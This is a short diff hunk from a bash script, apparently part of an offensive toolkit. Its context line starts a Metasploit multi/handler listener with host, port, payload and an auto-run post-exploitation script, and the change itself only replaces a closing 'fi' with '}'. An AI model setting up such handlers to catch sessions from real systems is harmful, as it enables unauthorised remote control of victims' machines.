@@ -716,7 +716,7 @@ fi
               xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
-   fi
+   }
 
 
 ## CLEANING EVERYTHING UP
